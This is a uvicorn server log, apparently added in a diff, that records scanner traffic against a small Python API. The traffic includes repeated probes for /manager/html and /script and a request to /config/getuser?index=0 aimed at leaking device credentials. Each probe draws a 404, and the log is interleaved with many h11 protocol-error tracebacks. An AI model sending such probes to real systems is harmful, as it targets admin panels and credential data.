+INFO:     209.141.40.103:37204 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.60.238:47871 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:43744 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:60538 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+INFO:     27.115.124.74:53047 - "GET / HTTP/1.0" 404 Not Found
+INFO:     27.115.124.37:45727 - "GET / HTTP/1.1" 404 Not Found
+INFO:     27.115.124.74:1986 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.74:16715 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     27.115.124.36:4952 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:41784 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     197.210.226.218:25876 - "GET /predict HTTP/1.1" 405 Method Not Allowed
+INFO:     197.210.226.218:25876 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:39112 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:55276 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     45.155.126.210:35077 - "GET / HTTP/1.1" 404 Not Found
+INFO:     184.105.139.70:37670 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:51896 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:58230 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:56622 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:49938 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     205.185.122.102:43114 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:37730 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:42938 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:57094 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     162.142.125.38:45836 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.38:50086 - "GET / HTTP/1.1" 404 Not Found
+INFO:     185.128.41.50:35894 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:49874 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:49618 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:45670 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:42130 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:56972 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:45582 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     192.64.5.69:57464 - "GET http%3A//www.eliteproxyswitcher.com/proxyjudge.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:57428 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:58216 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:42928 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:34966 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     209.141.54.139:50792 - "GET /index.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:41678 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:50712 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
